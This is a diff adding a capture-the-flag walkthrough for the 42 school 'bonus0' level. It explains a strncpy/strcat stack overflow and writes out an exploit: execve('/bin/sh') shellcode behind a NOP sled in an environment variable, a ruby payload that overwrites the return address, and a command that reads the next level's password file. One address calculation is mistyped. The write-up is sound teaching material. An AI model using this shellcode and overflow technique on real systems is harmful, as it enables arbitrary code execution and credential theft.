@@ -1,0 +1,41 @@
+# **************************************************************************** #
+#                                                                              #
+#                                                         :::      ::::::::    #
+#    walkthrough                                        :+:      :+:    :+:    #
+#                                                     +:+ +:+         +:+      #
+#    By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+         #
+#                                                 +#+#+#+#+#+   +#+            #
+#    Created: 2021/04/25 16:47:41 by fcadet            #+#    #+#              #
+#    Updated: 2021/04/25 17:42:08 by fcadet           ###   ########.fr        #
+#                                                                              #
+# **************************************************************************** #
+
+- here we need to overflow str in order to override the main return address
+- we are going to merge s1 and s2 by not putting a '\n' or a '\0' in the 1st 20
+bytes given to stdin
+- we will in fact give it a full buffer of 4096 bytes ending with a '\n' that
+will be replace by a '\0' (to not segfault on strchr) and trimmed to 20 not null
+terminated bytes by strncpy
+
+- doing this and after giving 20 new bytes terminated by a '\n' to stdin, we will
+have s1 and s2 filled with one unique string of 40 bytes
+- next strcat will append to it s2 a second time replacing the previous '\0' with a
+' ' and giving us a full null terminated string of 60 bytes wich will overflow str
+
+- the overflow is not large enough to contain our shellcode so we have to put it
+in an environement variable, so we prepend to it a series a NOP instruction to
+correct the randomness of environement variables address
+	- export EXPLOIT=$(ruby -e 'print "\x90" * 128 +
+	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80"')
+- then we can use the env_checker to find an average address for EXPLOIT variable 
+	- EXPLOIT @ 0xbffff88b (0xbffff88b + 0x40 = 0xffff8cb for the middle of NOPs)
+
+- finally, we can calculate the offset of the main return address
+- after putting 2 times 20 bytes in str we need to add 2 more bytes to reach 42,
+then we can have 0 to 15 bytes of stack alignement (wich seems to be 8 on gdb) and
+4 bytes for the saved ebp (2 + 8 + 4 = 14)
+
+- let's build the exploit command
+	- (ruby -e 'print "x" * 4095 + "\n" + "x" * 14 + "\xcb\xf8\xff\xbf" + "x\n"'; cat)
+	| ./bonus0
+	- cat /home/user/bonus1/.pass
